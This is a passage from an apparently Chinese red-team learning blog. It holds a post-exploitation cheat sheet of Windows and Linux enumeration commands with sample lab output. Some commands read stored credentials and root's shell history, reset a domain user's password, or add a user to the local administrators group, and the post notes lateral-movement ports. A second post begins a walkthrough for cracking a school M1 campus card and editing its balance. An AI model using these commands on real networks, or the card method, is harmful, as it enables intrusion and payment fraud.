class="hljs powershell">whoami /user &amp; whoami /priv</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/17.png" alt="检查当前shell权限"></p><h4 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a><strong>查看系统信息</strong></h4><p>收集信息主机名-&gt;扮演角色</p><pre><code class="hljs powershell">systeminfo主机名:           WIN<span class="hljs-literal">-2008</span>OS 名称:          Microsoft Windows Server <span class="hljs-number">2008</span> R2 StandardOS 版本:          <span class="hljs-number">6.1</span>.<span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span> Build <span class="hljs-number">7601</span>OS 制造商:        Microsoft CorporationOS 配置:          成员服务器OS 构件类型:      Multiprocessor Free注册的所有人:     Windows 用户注册的组织:产品 ID:          <span class="hljs-number">55041</span><span class="hljs-literal">-628</span><span class="hljs-literal">-5044404</span><span class="hljs-literal">-84151</span>初始安装日期:     <span class="hljs-number">2020</span>/<span class="hljs-number">10</span>/<span class="hljs-number">14</span>, <span class="hljs-number">14</span>:<span class="hljs-number">31</span>:<span class="hljs-number">07</span>系统启动时间:     <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">19</span>, <span class="hljs-number">18</span>:<span class="hljs-number">02</span>:<span class="hljs-number">28</span>系统制造商:       VMware, Inc.系统型号:         VMware Virtual Platform系统类型:         x64<span class="hljs-literal">-based</span> PC处理器:           安装了 <span class="hljs-number">1</span> 个处理器。                  [<span class="hljs-number">01</span>]: Intel64 Family <span class="hljs-number">6</span> Model <span class="hljs-number">142</span> Stepping <span class="hljs-number">10</span> GenuineIntel ~<span class="hljs-number">1992</span> MhzBIOS 版本:        Phoenix Technologies LTD <span class="hljs-number">6.00</span>, <span class="hljs-number">2020</span>/<span class="hljs-number">2</span>/<span class="hljs-number">27</span>Windows 目录:     C:\Windows系统目录:         C:\Windows\system32启动设备:         \Device\HarddiskVolume1系统区域设置:     zh<span class="hljs-literal">-cn</span>;中文(中国)输入法区域设置:   zh<span class="hljs-literal">-cn</span>;中文(中国)时区:             (UTC+<span class="hljs-number">08</span>:<span class="hljs-number">00</span>)北京，重庆，香港特别行政区，乌鲁木齐物理内存总量:     <span class="hljs-number">2</span>,<span class="hljs-number">047</span> MB可用的物理内存:   <span class="hljs-number">1</span>,<span class="hljs-number">529</span> MB虚拟内存: 最大值: <span class="hljs-number">4</span>,<span class="hljs-number">095</span> MB虚拟内存: 可用:   <span class="hljs-number">3</span>,<span class="hljs-number">562</span> MB虚拟内存: 使用中: <span class="hljs-number">533</span> MB页面文件位置:     C:\pagefile.sys域:               secice.cn登录服务器:       \\WIN<span class="hljs-literal">-2008</span>修补程序:         安装了 <span class="hljs-number">2</span> 个修补程序。                  [<span class="hljs-number">01</span>]: KB2999226                  [<span class="hljs-number">02</span>]: KB976902网卡:             安装了 <span class="hljs-number">2</span> 个 NIC。                  [<span class="hljs-number">01</span>]: Intel(<span class="hljs-built_in">R</span>) PRO/<span class="hljs-number">1000</span> MT Network Connection                      连接名:      本地连接                      启用 DHCP:   否                      IP 地址                        [<span class="hljs-number">01</span>]: <span class="hljs-number">192.168</span>.<span class="hljs-number">3.101</span>                        [<span class="hljs-number">02</span>]: fe80::<span class="hljs-number">15</span>a9:e224:<span class="hljs-number">1</span>f9b:<span class="hljs-number">336</span>                  [<span class="hljs-number">02</span>]: Intel(<span class="hljs-built_in">R</span>) PRO/<span class="hljs-number">1000</span> MT Network Connection                      连接名:      本地连接 <span class="hljs-number">2</span>                      启用 DHCP:   是                      DHCP 服务器: <span class="hljs-number">192.168</span>.<span class="hljs-number">126.254</span>                      IP 地址                        [<span class="hljs-number">01</span>]: <span class="hljs-number">192.168</span>.<span class="hljs-number">126.175</span>                        [<span class="hljs-number">02</span>]: fe80::d1cb:<span class="hljs-number">2</span>aa2:fe1f:d647</code></pre><h4 id="Tcp-udp-网络连接状态信息"><a href="#Tcp-udp-网络连接状态信息" class="headerlink" title="Tcp/udp 网络连接状态信息"></a><strong>Tcp/udp 网络连接状态信息</strong></h4><p>可以获取内网IP分布状态-服务（redis)</p><pre><code class="hljs powershell">netstat <span class="hljs-literal">-ano</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/18.png" alt="Tcp/udp 网络连接状态信息"></p><h4 id="查看机器名"><a href="#查看机器名" class="headerlink" title="查看机器名"></a><strong>查看机器名</strong></h4><pre><code class="hljs powershell">hostname</code></pre><h4 id="查看当前操作系统"><a href="#查看当前操作系统" class="headerlink" title="查看当前操作系统"></a><strong>查看当前操作系统</strong></h4><pre><code class="hljs pgsql">wmic OS <span class="hljs-keyword">get</span> Caption,CSDVersion,OSArchitecture,<span class="hljs-keyword">Version</span> ver</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/19.png" alt="查看当前操作系统"></p><h4 id="查看当前安装的程序"><a href="#查看当前安装的程序" class="headerlink" title="查看当前安装的程序"></a><strong>查看当前安装的程序</strong></h4><pre><code class="hljs applescript">wmic product <span class="hljs-keyword">get</span> <span class="hljs-built_in">name</span>,<span class="hljs-built_in">version</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20.png" alt="查看当前安装的程序"></p><h4 id="查看在线用户"><a href="#查看在线用户" class="headerlink" title="查看在线用户"></a><strong>查看在线用户</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">quser</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/21.png" alt="查看在线用户"></p><h4 id="查看网络配置"><a href="#查看网络配置" class="headerlink" title="查看网络配置"></a><strong>查看网络配置</strong></h4><p>有 Primary Dns Suff就说明是域内，空的则当前机器应该在工作组</p><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/22.png" alt="查看网络配置"></p><h4 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a><strong>查看进程</strong></h4><p>有些进程可能是域用户启的-&gt;通过管理员权限凭证窃取-&gt;窃取域用户的凭证</p><pre><code class="hljs jboss-cli">tasklist <span class="hljs-string">/v</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/23.png" alt="查看进程"></p><h4 id="查看当前登陆域"><a href="#查看当前登陆域" class="headerlink" title="查看当前登陆域"></a><strong>查看当前登陆域</strong></h4><pre><code class="hljs arduino">net <span class="hljs-built_in">config</span> workstation</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/24.png" alt="查看当前登陆域"></p><h4 id="远程桌面链接历史记录"><a href="#远程桌面链接历史记录" class="headerlink" title="远程桌面链接历史记录"></a><strong>远程桌面链接历史记录</strong></h4><p>可以把凭证取下来-&gt;本地解密</p><pre><code class="hljs jboss-cli">cmdkey <span class="hljs-string">/l</span></code></pre><h4 id="查看本机上的用户账户列表"><a href="#查看本机上的用户账户列表" class="headerlink" title="查看本机上的用户账户列表"></a><strong>查看本机上的用户账户列表</strong></h4><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title"></span></code></pre><h4 id="查看本机用户xxx的信息"><a href="#查看本机用户xxx的信息" class="headerlink" title="查看本机用户xxx的信息"></a><strong>查看本机用户xxx的信息</strong></h4><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span></code></pre><h4 id="查看本机用户xxx的信息-1"><a href="#查看本机用户xxx的信息-1" class="headerlink" title="查看本机用户xxx的信息"></a><strong>查看本机用户xxx的信息</strong></h4><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span> 显示所在域的用户名单net <span class="hljs-keyword">user</span> <span class="hljs-title">域用户 /domain</span>获取某个域用户的详细信息 net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span> xxx <span class="hljs-number">12345678</span> 修改域用户密码，需要域管理员权限</code></pre><hr><h3 id="Windows（域）"><a href="#Windows（域）" class="headerlink" title="Windows（域）"></a>Windows（域）</h3><pre><code class="hljs powershell">nltest /domain_trusts /all_trusts /v /server:<span class="hljs-number">192.168</span>.<span class="hljs-number">126.175</span>    返回所有信任域列表nltest /dsgetdc:secice /server:<span class="hljs-number">192.168</span>.<span class="hljs-number">3.101</span>       返回域控和其相应的IP地net user /<span class="hljs-keyword">do</span>    获取域用户列表net <span class="hljs-built_in">group</span> /domain查看域里面的组。net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain computers&quot;</span> /domain查看域内所有的主机计算机名。net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain admins&quot;</span> /domain查看域管理员。net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain controllers&quot;</span> /domain查看域控制器。net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;enterprise admins&quot;</span> /domain查看企业管理组。net localgroup administrators   本机管理员[通常含有域用户]net localgroup administrators /domain    登录本机的域管理员 net localgroup administrators workgroup\user001 /add    域用户添加到本机</code></pre><pre><code class="hljs powershell">net view 查看同一域内机器列表 net view \\ip查看某IP共享net view \\GHQ    查看GHQ计算机的共享资源列表 net view /domain查看内网存在多少个域 net view /domain:XYZ查看XYZ域中的机器列表 net accounts /domain查询域用户密码过期等信息net time/domain查看时间服务器。</code></pre><p>定位域控IP</p><pre><code class="hljs powershell"><span class="hljs-number">1</span>)ipconfig /all通常域内主机 DNS 地址就是域控地址<span class="hljs-number">2</span>)查看开启 <span class="hljs-number">53</span>，<span class="hljs-number">389</span> 等端口的主机<span class="hljs-number">3</span>)net time /domain &amp;&amp; ping DC.secice.cn</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a><strong>查看当前权限</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">whoami</span></code></pre><h4 id="查看网卡配置"><a href="#查看网卡配置" class="headerlink" title="查看网卡配置"></a><strong>查看网卡配置</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span></code></pre><h4 id="查看端口状态（开启了哪些服务，内网IP连接等"><a href="#查看端口状态（开启了哪些服务，内网IP连接等" class="headerlink" title="查看端口状态（开启了哪些服务，内网IP连接等"></a><strong>查看端口状态（开启了哪些服务，内网IP连接等</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -anpt</span></code></pre><h4 id="查看进程状态（开启了哪些服务等）"><a href="#查看进程状态（开启了哪些服务等）" class="headerlink" title="查看进程状态（开启了哪些服务等）"></a><strong>查看进程状态（开启了哪些服务等）</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">ps -ef</span></code></pre><h4 id="查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）"><a href="#查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）" class="headerlink" title="查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）"></a><strong>查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）</strong></h4><pre><code class="hljs awk">cat <span class="hljs-regexp">/root/</span>.bash_history</code></pre><h4 id="查找某个文件（寻找配置文件等）"><a href="#查找某个文件（寻找配置文件等）" class="headerlink" title="查找某个文件（寻找配置文件等）"></a><strong>查找某个文件（寻找配置文件等）</strong></h4><pre><code class="hljs nginx"><span class="hljs-attribute">find</span> / -name <span class="hljs-regexp">*.cfg</span></code></pre><hr><h2 id="10、后渗透信息收集之wmic命令的一些使用方法"><a href="#10、后渗透信息收集之wmic命令的一些使用方法" class="headerlink" title="10、后渗透信息收集之wmic命令的一些使用方法"></a>10、后渗透信息收集之wmic命令的一些使用方法</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>wmic和cmd一样在所有的windows版本中都存在，同时wmic有很多cmd下不方便使用的部分，今天给大家介绍一些在后渗透过程中非常适用的使用wmic进行信息收集的命令</p><h3 id="关于wmic"><a href="#关于wmic" class="headerlink" title="关于wmic"></a><strong>关于wmic</strong></h3><p>WMI命令行（WMIC）实用程序为WMI提供了命令行界面。WMIC与现有的Shell和实用程序命令兼容。在WMIC出现之前，如果要管理WMI系统，必须使用一些专门的WMI应用，例如SMS，或者使用WMI的脚本编程API，或者使用象CIM Studio之类的工具。如果不熟悉C++之类的编程语言或VBScript之类的脚本语言，或者不掌握WMI名称空间的基本知识，要用WMI管理系统是很困难的，WMIC改变了这种情况</p><h3 id="wmic的简单使用"><a href="#wmic的简单使用" class="headerlink" title="wmic的简单使用"></a>wmic的简单使用</h3><p>首先在cmd命令行输入<code>wmic</code>进入交互式页面，这里说一下在powershell也可以和cmd命令行一样的操作<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/25.png" alt="wmic的简单使用"></p><pre><code class="hljs arduino">/?查看WMIC命令的全局选项以及命令属性等<span class="hljs-built_in">process</span> /?进程管理的帮助wmic <span class="hljs-built_in">process</span> <span class="hljs-built_in">get</span> /?   属性获取操作帮助</code></pre><p>根据实际的需要去对相关的信息进行读取</p><h3 id="以进程为例展现wmic的使用"><a href="#以进程为例展现wmic的使用" class="headerlink" title="以进程为例展现wmic的使用"></a>以进程为例展现wmic的使用</h3><p>这里的靶机是<code>server 2008</code>的虚拟机，这里以查看进程为例：</p><h4 id="获取系统当前正在运行的进程等信息"><a href="#获取系统当前正在运行的进程等信息" class="headerlink" title="获取系统当前正在运行的进程等信息"></a>获取系统当前正在运行的进程等信息</h4><pre><code class="hljs arduino">wmic <span class="hljs-built_in">process</span> <span class="hljs-built_in">get</span> caption,executablepath,processid</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/26.png" alt="获取进程信息"></p><h4 id="查看服务进程详细信息"><a href="#查看服务进程详细信息" class="headerlink" title="查看服务进程详细信息"></a>查看服务进程详细信息</h4><pre><code class="hljs pf">wmic service where (<span class="hljs-keyword">state</span>=<span class="hljs-string">&quot;running&quot;</span>) get name ,processid ,pathname ,startmode ,caption</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/27.png" alt="获取进程详细信息"></p><h4 id="系统安装软件情况"><a href="#系统安装软件情况" class="headerlink" title="系统安装软件情况"></a>系统安装软件情况</h4><pre><code class="hljs applescript">wmic product <span class="hljs-keyword">get</span> <span class="hljs-built_in">name</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20.png" alt="查看当前安装的程序"></p><h4 id="系统环境变量"><a href="#系统环境变量" class="headerlink" title="系统环境变量"></a>系统环境变量</h4><pre><code class="hljs routeros">wmic environment <span class="hljs-builtin-name">get</span> Description, VariableValue</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/28.png" alt="查看当前安装的程序"></p><p>关于更多的信息可以通过官方的说明文档</p><p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic</a></p><h3 id="关于powershell的Get-Wmi对象"><a href="#关于powershell的Get-Wmi对象" class="headerlink" title="关于powershell的Get-Wmi对象"></a>关于powershell的Get-Wmi对象</h3><p><code>Get-Wmi</code>是获取<code>Windows Management Instrumentation（WMI）</code>类的实例或有关可用类的信息。我们需要首先知道自己的 windows计算机支持那些可用的WMI类</p><pre><code class="hljs lsl">Get-Wmiobject -<span class="hljs-type">list</span> 自己的windows计算机支持那些可用的WMI类</code></pre><pre><code class="hljs dsconfig"><span class="hljs-built_in">get-wmiobject</span><span class="hljs-built_in">get-wmiobject</span> -<span class="hljs-string">class </span><span class="hljs-string">win32_process</span>在本地计算机上获取进程</code></pre><p>具体的参数以及命令在官方文档中进行查询：</p><p><a href="https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Management/Get-WmiObject?view=powershell-5.l#parameters">https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Management/Get-WmiObject?view=powershell-5.l#parameters</a></p><h2 id="11、内网横向常见端口"><a href="#11、内网横向常见端口" class="headerlink" title="11、内网横向常见端口"></a>11、内网横向常见端口</h2><h3 id="Port-445"><a href="#Port-445" class="headerlink" title="Port. 445"></a>Port. 445</h3><p>SMB( Server Message Block) Windows协议族，主要功能为文件打印共享服务，简单来讲就是共享文件夹</p><p>该端口也是近年来内网横向扩展中比较火的端口，大名鼎鼎的永恒之蓝漏洞就是利用该端口，操作为扫描其是否存在MS17-010漏洞。正常情况下，其命令主要是建立IPC服务中</p><h4 id="空会话"><a href="#空会话" class="headerlink" title="空会话"></a><strong>空会话</strong></h4><pre><code class="hljs apache"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.x</code></pre><h4 id="远程本地认证"><a href="#远程本地认证" class="headerlink" title="远程本地认证"></a><strong>远程本地认证</strong></h4><pre><code class="hljs sql">net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span> /<span class="hljs-keyword">user</span>:a\username <span class="hljs-keyword">password</span></code></pre><p>注：a/username 中 a 为工作组情况下的机器命名，可以为任意字符，例如workgroup/username</p><h4 id="域-test-local-远程认证"><a href="#域-test-local-远程认证" class="headerlink" title="域 test.local 远程认证"></a><strong>域 test.local 远程认证</strong></h4><pre><code class="hljs sql">net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span> /<span class="hljs-keyword">user</span>:<span class="hljs-keyword">test</span>\username <span class="hljs-keyword">password</span></code></pre><h3 id="Port-137、138、139"><a href="#Port-137、138、139" class="headerlink" title="Port:137、138、139"></a>Port:137、138、139</h3><p>NetBios端口，137、138为UDP端口，主要用于内网传输文件，而NetBios/SMB服务的获取主要是通过139端口</p><h3 id="Port-135"><a href="#Port-135" class="headerlink" title="Port: 135"></a><strong>Port: 135</strong></h3><p>该端口主要使用<code>DCOM</code>和<code>RPC（Remote Procedure Call）</code>服务，我们利用这个端口主要做<code>WMI（Windows Management Instrumentation）</code>管理工具的远程操作</p><ul><li>使用时需要开启wmic服务</li><li>几乎所有的命令都是管理员权限</li><li>如果出现 “Invalid Globa| Switch”，需要使用双引号把该加的地方都加上 </li><li>远程系统的本地安全策略的“网络访问：本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”</li><li>防火墙最好是关闭状态</li></ul><h3 id="Port-53"><a href="#Port-53" class="headerlink" title="Port: 53"></a><strong>Port: 53</strong></h3><p>该端口为DNS服务端口，只要提供域名解析服务使用，该端口在渗透过程中可以寻找一下DNS域传送漏洞，在内网中可以使用DNS协议进行通信传输，隐蔽性更加好<br><strong>参考文章</strong> ：</p><h4 id="dns隧道之dns2tcp"><a href="#dns隧道之dns2tcp" class="headerlink" title="dns隧道之dns2tcp"></a>dns隧道之dns2tcp</h4><ul><li><a href="https://blog.csdn.net/gsls200808/article/details/50318947">https://blog.csdn.net/gsls200808/article/details/50318947</a></li><li><a href="https://blog.csdn.net/deng_xj/article/details/88834124">https://blog.csdn.net/deng_xj/article/details/88834124</a></li></ul><h4 id="dns隧道之unseat2"><a href="#dns隧道之unseat2" class="headerlink" title="dns隧道之unseat2"></a>dns隧道之unseat2</h4><ul><li><a href="https://www.cnblogs.com/bonelee/p/7927706.html">https://www.cnblogs.com/bonelee/p/7927706.html</a></li><li><a href="https://blog.csdn.net/ddr12231/article/details/102306989">https://blog.csdn.net/ddr12231/article/details/102306989</a></li></ul><h3 id="Port-389"><a href="#Port-389" class="headerlink" title="Port: 389"></a><strong>Port: 389</strong></h3><p>用于LADP（轻量级目录访问协议），属于TCP/IP协议，在域过程中一般出现在域控上出现该端口，进行权限认证服务，如果拥有对该域的用户，且担心net或者其他爆破方法不可行的情况，可以尝试使用LADP端口进行爆破</p><p>工具可以使用类似于hydra等开源项目</p><h3 id="Port-88"><a href="#Port-88" class="headerlink" title="Port: 88"></a><strong>Port: 88</strong></h3><p>该端口主要开启Kerberos服务，属于TCP/IP协议，主要任务是监听KDC的票据请求，该协议在渗透过程中可以进行黄金票据和白银票据的伪造，以横向扩展某些服务</p><h3 id="Port-5985"><a href="#Port-5985" class="headerlink" title="Port: 5985"></a><strong>Port: 5985</strong></h3><p>该端口主要介绍WinRM服务，WinRM是Windows对WS-Management的实现，WinRM允许远程用户使用工具和脚本对Windows服务器进行管理并获取数据。并且WinRM服务自Windows Vista开始成为Windows的默认组件</p><p>条件:</p><ul><li>Windows Vista上必须手动启动，而Windows Server 2008 中服务是默认开启的 </li><li>服务在后台开启，但是端口还没有开启监听，所以需要开启端口 </li><li>使用 winrm quickconfig 对winRM进行配置，开启HTTP和HTTPSS监听，且需要开启防火墙</li></ul>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队攻防</tag>
      
      <tag>渗透攻击红队百科全书</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我是如何破解学校一慧通的</title>
    <link href="/p/c92f138d.html"/>
    <url>/p/c92f138d.html</url>
    
    <content type="html"><![CDATA[<p>文章是大学的时候写的，现在毕业多年，打算将过程写出来分享下学习思路</p><div class="note note-primary">            <p>本文章只做技术交流，请勿将文章中涉及技术用于非法或其他用途，由此产生纠纷问题均与本人无关！</p>          </div><h2 id="一、破解打水功能"><a href="#一、破解打水功能" class="headerlink" title="一、破解打水功能"></a>一、破解打水功能</h2><p>用到的工具：</p><blockquote><p>读卡设备：ACCR122U一个</p></blockquote><blockquote><p>空白M1卡片一张</p></blockquote><blockquote><p>在用的一慧通一张 </p></blockquote><p>上图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/01.png" alt="我是如何破解学校一慧通的"></p><blockquote><p>平台：windows7</p></blockquote><blockquote><p>软件：NFCGUI-Pro.exe</p></blockquote><blockquote><p>M1卡服务程序</p></blockquote><h3 id="具体实施："><a href="#具体实施：" class="headerlink" title="具体实施："></a>具体实施：</h3><p>先去打水那查看卡内的余额：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/02.png" alt="我是如何破解学校一慧通的"></p><p>卡内余额为29.85元，然后将ACR122u插在机器上，使用M1卡服务程序破解得出卡内的DUMP文件</p><p>使用M1卡服务器程序破解：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/03.png" alt="我是如何破解学校一慧通的"></p><p>破解成功</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/04.png" alt="我是如何破解学校一慧通的"></p><p>破解了好久终于破解成功，dump文件会生成在文件目录下：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/05.png" alt="我是如何破解学校一慧通的"></p><p><code>dumpfile 09d222aa (2015-11-1210_37_36) 1K.dump</code>文件就是生成的破解文件  可以看到生成的dump文件为1KB大小，但是具体写入M1卡的时候是需要写入4KB大小的dump文件的</p><p>我是可以使用NFCGUI-PRO.exe修复，</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/06.png" alt="我是如何破解学校一慧通的"></p><p>打开这个软件点击选择文件-选择刚才生成的1KB文件-就会提示“是否保存为4K文件格式”—选择“是”-就是自带修复成功</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/07.png" alt="我是如何破解学校一慧通的"></p><p>然后关闭软件，刚才的1kb的DUMP文件就会自带修复为4KB文件了。</p><p>通过上面的方法再得到两个不同金额的dump文件。</p><p>通过十六进制编辑器进行dump文件的对比，找出金额控制位，我使用winhex进行编辑dump文件：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/08.png" 